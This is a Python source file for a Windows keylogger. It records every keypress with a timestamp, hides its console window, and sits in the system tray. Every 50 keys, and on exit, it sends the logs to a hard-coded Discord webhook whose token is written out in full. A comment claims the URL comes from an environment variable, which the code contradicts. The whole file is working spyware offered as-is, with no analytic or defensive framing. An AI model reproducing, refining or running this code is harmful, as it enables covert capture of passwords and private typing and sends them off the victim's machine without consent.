import keyboard
import requests
from datetime import datetime
import atexit
import sys
import winreg as reg
from pystray import Icon, Menu, MenuItem
from PIL import Image
import os
import win32gui
import win32con

# Load webhook URL from environment variable for security
WEBHOOK_URL = ('https://discord.com/api/webhooks/1328523154871685120/J-7ke25fi7mQoiNVwcobBVAHWG3WiYpuAARiFNJ6KT-LddNwVhU8D-j9cDMrMex_Kch5')
if not WEBHOOK_URL:
    raise ValueError("DISCORD_WEBHOOK_URL environment variable not set")

KEYS_PER_REPORT = 50

keylog_data = []

def on_key_press(event):
    global keylog_data
    key = event.name
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted_key = f"[{timestamp}] {key}"
    keylog_data.append(formatted_key)
    
    if len(keylog_data) >= KEYS_PER_REPORT:
        send_report()

def format_report():
    report = "Keylog Report:\n```"
    for key in keylog_data:
        report += f"{key}\n"
    report += "```"
    return report

def send_report():
    global keylog_data
    if keylog_data:
        report = format_report()
        payload = {"content": report}
        try:
            response = requests.post(WEBHOOK_URL, json=payload)
            if response.status_code == 204:
                return True
            else:
                print(f"Failed to send report. Status code: {response.status_code}")
                return False
        except Exception as e:
            print(f"Error sending report: {str(e)}")
            return False
        finally:
            keylog_data = []

def exit_handler():
    keyboard.unhook_all()  # Cleanup keyboard hooks
    send_report()

def hide_terminal():
    try:
        # Get the handle of the console window
        console_window = win32gui.GetForegroundWindow()
        # Hide the console window
        win32gui.ShowWindow(console_window, win32con.SW_HIDE)
        return True
    except Exception as e:
        print(f"Failed to hide terminal: {str(e)}")
        return False

def on_quit():
    send_report()
    icon.stop()
    sys.exit()

# Create a colored icon (16x16 pixels, blue color)
icon_image = Image.new('RGB', (16, 16), color='blue')

menu = Menu(MenuItem('Quit', on_quit))
icon = Icon("Keylogger", icon_image, "Keylogger", menu)

atexit.register(exit_handler)
keyboard.on_press(on_key_press)
hide_terminal()  # Hide the terminal window

print("Keylogger is running in the system tray.")
icon.run()


